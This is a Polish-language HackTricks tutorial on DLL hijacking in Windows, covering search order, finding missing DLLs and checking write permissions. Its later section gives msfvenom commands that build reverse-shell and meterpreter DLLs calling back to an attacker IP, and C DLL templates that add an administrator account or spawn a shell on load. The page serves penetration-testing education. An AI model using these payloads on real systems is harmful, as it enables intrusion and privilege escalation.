# Dll Hijacking

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Wskazówka dotycząca bug bounty**: **Zarejestruj się** na platformie **bug bounty Intigriti**, premium platformie **bug bounty stworzonej przez hakerów, dla hakerów**! Dołącz do nas na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) już dziś i zacznij zarabiać nagrody aż do **100 000 USD**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Podstawowe informacje

Hakowanie DLL polega na manipulowaniu zaufanej aplikacji tak, aby załadowała złośliwą DLL. Ten termin obejmuje kilka taktyk, takich jak **Podmiana DLL, Wstrzykiwanie i Ładowanie Bocznikowe DLL**. Jest głównie wykorzystywany do wykonania kodu, osiągnięcia trwałości i, rzadziej, eskalacji uprawnień. Pomimo skupienia się tutaj na eskalacji, metoda przejęcia pozostaje spójna niezależnie od celów.

### Powszechne techniki

Stosuje się kilka metod hakowania DLL, z których każda ma swoją skuteczność w zależności od strategii ładowania DLL aplikacji:

1. **Podmiana DLL**: Zamiana prawdziwej DLL na złośliwą, opcjonalnie z użyciem Proxy DLL do zachowania funkcjonalności oryginalnej DLL.
2. **Hakowanie Kolejności Wyszukiwania DLL**: Umieszczenie złośliwej DLL w ścieżce wyszukiwania przed prawdziwą, wykorzystując wzorzec wyszukiwania aplikacji.
3. **Hakowanie DLL Widmo**: Utworzenie złośliwej DLL, którą aplikacja załaduje, myśląc, że jest to nieistniejąca wymagana DLL.
4. **Przekierowanie DLL**: Modyfikacja parametrów wyszukiwania, takich jak `%PATH%` lub pliki `.exe.manifest` / `.exe.local`, aby skierować aplikację do złośliwej DLL.
5. **Podmiana DLL WinSxS**: Zastąpienie prawidłowej DLL złośliwym odpowiednikiem w katalogu WinSxS, metoda często kojarzona z ładowaniem bocznikowym DLL.
6. **Hakowanie DLL ze Ścieżką Względną**: Umieszczenie złośliwej DLL w katalogu kontrolowanym przez użytkownika z skopiowaną aplikacją, przypominające techniki Wykonania Binarnego przez Proxy.

## Wyszukiwanie brakujących DLL

Najczęstszym sposobem na znalezienie brakujących DLL w systemie jest uruchomienie [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) z sysinternals, **ustawienie** **następujących 2 filtrów**:

![](<../../../.gitbook/assets/image (311).png>)

![](<../../../.gitbook/assets/image (313).png>)

i po prostu pokaż **Aktywność Systemu Plików**:

![](<../../../.gitbook/assets/image (314).png>)

Jeśli szukasz **brakujących dll ogólnie**, pozostaw to uruchomione przez kilka **sekund**.\
Jeśli szukasz **brakującej dll w konkretnej aplikacji**, powinieneś ustawić **inny filtr, np. "Nazwa Procesu" "zawiera" "\<nazwa wykonawcza>", uruchomić go i zatrzymać przechwytywanie zdarzeń**.

## Wykorzystywanie brakujących DLL

Aby eskalować uprawnienia, najlepszą szansą jest **możliwość napisania dll, którą proces uprzywilejowany spróbuje załadować** w miejscu, gdzie będzie **wyszukiwana**. Dlatego będziemy mogli **napisać** dll w **folderze**, gdzie **dll jest wyszukiwana wcześniej** niż w folderze, gdzie znajduje się **oryginalna dll** (dziwny przypadek), lub będziemy mogli **napisać w jakimś folderze, gdzie dll będzie wyszukiwana** i oryginalna **dll nie istnieje** w żadnym folderze.

### Kolejność Wyszukiwania DLL

W [**dokumentacji Microsoftu**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **można znaleźć, jak dokładnie są ładowane DLL**.

**Aplikacje systemu Windows** szukają DLL-ek, podążając za zestawem **predefiniowanych ścieżek wyszukiwania**, zgodnie z określoną sekwencją. Problem hakowania DLL pojawia się, gdy szkodliwa DLL jest strategicznie umieszczona w jednym z tych katalogów, zapewniając, że zostanie załadowana przed autentyczną DLL. Rozwiązaniem zapobiegającym temu jest upewnienie się, że aplikacja używa ścieżek bezwzględnych przy odwoływaniu się do wymaganych DLL-ek.

Poniżej przedstawiono **domyślną** kolejność wyszukiwania DLL-ek na systemach **32-bitowych**:

1. Katalog, z którego została załadowana aplikacja.
2. Katalog systemowy. Użyj funkcji [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), aby uzyskać ścieżkę tego katalogu.(_C:\Windows\System32_)
3. Katalog systemowy 16-bitowy. Nie ma funkcji, która pobierałaby ścieżkę tego katalogu, ale jest on przeszukiwany. (_C:\Windows\System_)
4. Katalog systemowy Windows. Użyj funkcji [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), aby uzyskać ścieżkę tego katalogu.
5. (_C:\Windows_)
6. Bieżący katalog.
7. Katalogi wymienione w zmiennej środowiskowej PATH. Należy zauważyć, że nie obejmuje to ścieżki określonej dla aplikacji za pomocą klucza rejestru **App Paths**. Klucz **App Paths** nie jest używany podczas obliczania ścieżki wyszukiwania DLL-ek.

To jest **domyślna** kolejność wyszukiwania z włączonym **SafeDllSearchMode**. Gdy jest on wyłączony, bieżący katalog awansuje na drugie miejsce. Aby wyłączyć tę funkcję, utwórz wartość rejestru **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i ustaw ją na 0 (domyślnie jest włączona).

Jeśli funkcja [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) jest wywoływana z parametrem **LOAD\_WITH\_ALTERED\_SEARCH\_PATH**, wyszukiwanie zaczyna się w katalogu modułu wykonywalnego, który **LoadLibraryEx** ładuje.

Na koniec zauważ, że **dll może być załadowana, wskazując pełną ścieżkę zamiast tylko nazwy**. W takim przypadku ta dll jest **tylko wyszukiwana w tej ścieżce** (jeśli dll ma jakieś zależności, będą one wyszukiwane jako właśnie załadowane według nazwy).

Istnieją inne sposoby zmiany kolejności wyszukiwania, ale tutaj nie będę ich wyjaśniać.

#### Wyjątki w kolejności wyszukiwania DLL według dokumentacji systemu Windows

Pewne wyjątki od standardowej kolejności wyszukiwania DLL są zauważone w dokumentacji systemu Windows:

* Gdy **napotkano DLL o nazwie identycznej z już załadowaną w pamięci**, system omija zwykłe wyszukiwanie. Zamiast tego, wykonuje sprawdzenie przekierowania i manifestu, zanim przejdzie do załadowanej już w pamięci DLL. **W tym scenariuszu system nie przeprowadza wyszukiwania dla DLL**.
* W przypadkach, gdy DLL jest rozpoznawana jako **znana DLL** dla obecnej wersji Windows, system będzie korzystał z własnej wersji znanej DLL, wraz z jej zależnymi DLL, **pomijając proces wyszukiwania**. Klucz rejestru **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** przechowuje listę tych znanych DLL-ów.
* Jeśli **DLL ma zależności**, wyszukiwanie tych zależnych DLL-ów jest przeprowadzane tak, jakby były wskazane jedynie przez swoje **nazwy modułów**, niezależnie od tego, czy początkowa DLL została zidentyfikowana za pomocą pełnej ścieżki.

### Eskalacja uprawnień

**Wymagania**:

* Zidentyfikuj proces, który działa lub będzie działał pod **innymi uprawnieniami** (ruch poziomy lub boczny), który **nie posiada DLL**.
* Upewnij się, że masz **uprawnienia do zapisu** w dowolnym **katalogu**, w którym będzie **wyszukiwana DLL**. Lokalizacja ta może być katalogiem wykonywalnym lub katalogiem w ścieżce systemowej.

Tak, wymagania są trudne do spełnienia, ponieważ **domyślnie jest dziwne znalezienie uprzywilejowanego pliku wykonywalnego bez DLL** i jest jeszcze **dziwniej mieć uprawnienia do zapisu w folderze ścieżki systemowej** (domyślnie nie można tego zrobić). Jednakże, w źle skonfigurowanych środowiskach jest to możliwe.\
W przypadku, gdy masz szczęście i spełniasz wymagania, możesz sprawdzić projekt [UACME](https://github.com/hfiref0x/UACME). Nawet jeśli **głównym celem projektu jest obejście UAC**, możesz tam znaleźć **przykładowy kod** wykorzystujący przechwytywanie DLL dla wersji Windows, którą możesz wykorzystać (prawdopodobnie wystarczy zmienić ścieżkę folderu, w którym masz uprawnienia do zapisu).

Zauważ, że możesz **sprawdzić swoje uprawnienia w folderze** wykonując:

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

I sprawdź uprawnienia wszystkich folderów wewnątrz ŚCIEŻKA:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Możesz również sprawdzić importy pliku wykonywalnego oraz eksporty biblioteki DLL za pomocą:

```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Dla pełnego przewodnika dotyczącego **nadużywania Dll Hijacking w celu eskalacji uprawnień** z uprawnieniami do zapisywania w folderze **System Path**, sprawdź:

{% content-ref url="writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Narzędzia automatyzujące

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)sprawdzi, czy masz uprawnienia do zapisu w dowolnym folderze w ścieżce systemowej.\
Inne interesujące narzędzia automatyzujące do odkrywania tej podatności to funkcje **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll._

### Przykład

W przypadku znalezienia podatnego scenariusza jedną z najważniejszych rzeczy do pomyślnego wykorzystania byłoby **utworzenie dll, która eksportuje co najmniej wszystkie funkcje, które wykonywalny będzie importował z niej**. Niemniej jednak, zauważ, że Dll Hijacking przydaje się do [eskaltacji z poziomu Medium Integrity na High **(omijając UAC)**](../../authentication-credentials-uac-and-efs/#uac) lub z [**High Integrity na SYSTEM**](../#from-high-integrity-to-system)**.** Możesz znaleźć przykład **jak utworzyć prawidłową dll** w ramach tego studium dotyczącego Dll Hijacking skupionego na Dll Hijacking do wykonania: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ponadto, w **następnej sekcji** znajdziesz kilka **podstawowych kodów dll**, które mogą być przydatne jako **szablony** lub do utworzenia **dll z nie wymaganymi funkcjami eksportowanymi**.

## **Tworzenie i kompilowanie Dlls**

### **Proksowanie Dll**

W zasadzie **Dll proxy** to Dll zdolna do **wykonania twojego złośliwego kodu podczas ładowania**, ale także do **odsłonięcia** i **pracy** jak **oczekiwano** poprzez **przekazywanie wszystkich wywołań do prawdziwej biblioteki**.

Dzięki narzędziu [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) lub [**Spartacus**](https://github.com/Accenture/Spartacus) możesz faktycznie **wskazać wykonywalny plik i wybrać bibliotekę**, którą chcesz zproksować i **wygenerować zproksowaną dll** lub **wskazać Dll** i **wygenerować zproksowaną dll**.

### **Meterpreter**

**Otrzymaj powłokę rev (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Uzyskaj meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Utwórz użytkownika (nie zauważyłem wersji x64):**

```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Twój własny

Należy pamiętać, że w kilku przypadkach Dll, które kompilujesz, musi **eksportować kilka funkcji**, które zostaną załadowane przez proces ofiary; jeśli te funkcje nie istnieją, **binarny plik nie będzie w stanie ich załadować**, a **exploitacja zakończy się niepowodzeniem**.

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```

## Odnośniki

* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Wskazówka dotycząca nagrody za błąd**: **Zarejestruj się** na platformie **Intigriti**, premium **platformie do nagród za błędy stworzonej przez hakerów, dla hakerów**! Dołącz do nas na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) już dziś i zacznij zarabiać nagrody do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
